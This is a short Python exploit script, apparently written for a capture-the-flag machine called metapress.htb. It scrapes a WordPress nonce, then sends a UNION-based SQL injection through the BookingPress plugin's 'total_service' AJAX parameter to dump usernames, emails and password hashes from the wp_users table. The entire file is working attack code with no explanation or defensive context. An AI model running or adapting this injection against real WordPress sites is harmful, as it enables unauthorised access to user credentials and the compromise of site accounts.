#!/usr/bin/env python3
import requests
import re
from json import loads,dumps

def getNonce() -> str:
    response = requests.get("http://metapress.htb/events/")
    content = response.text
    regex = "_wpnonce:'([0-9a-f]*)'"
    return re.findall(regex, content)[0]

def runQuery(nonce: str, sql: str) -> dict:
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    body = {
            "action": "bookingpress_front_get_category_services",
            "_wpnonce": nonce,
            "category_id": 33,
            "total_service": f"-1234) union {sql}-- -"
            }
    response = requests.post("http://metapress.htb/wp-admin/admin-ajax.php", headers=headers, data=body)
    return loads(response.text)

def enumWordpressUsers(nonce: str) -> dict:
    query = "select null,null,null,null,null,null,user_login,user_email,user_pass from wp_users"
    response = runQuery(nonce, query)
    users = {}
    for results in response:
        username = results.get("bookingpress_service_description")
        email = results.get("bookingpress_service_position")
        password = results.get("bookingpress_servicedate_created")
        data = {"Email": email, "Password": password}
        users[username] = data
    return users

def main():
    nonce = getNonce()
    users = enumWordpressUsers(nonce)
    print(dumps(users, indent=2))

if __name__ == "__main__":
    main()
